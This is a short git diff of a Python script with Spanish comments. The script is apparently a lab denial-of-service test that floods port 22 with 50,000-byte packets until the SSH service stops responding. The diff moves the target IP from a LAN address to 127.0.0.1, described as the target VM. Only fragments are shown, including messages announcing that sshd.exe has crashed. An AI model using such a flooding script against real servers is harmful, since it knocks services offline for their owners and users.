@@ -1,7 +1,7 @@
 import socket
 import time
 
-LHOST = "192.168.1.18" 
+LHOST = "127.0.0.1" #La IP objetivo/ de la VM 
 PORT = 22
 carga = 50000 # Tamaño de paquete grande para saturar rápido
 
@@ -27,3 +27,4 @@ while True:
         print(f"\n[!!!] ¡EL SERVICIO HA COLAPSADO! No se pudo conectar: {e}")
         print("[*] Revisa el Monitor de Recursos en Windows, sshd.exe debería haber muerto.")
         break
+
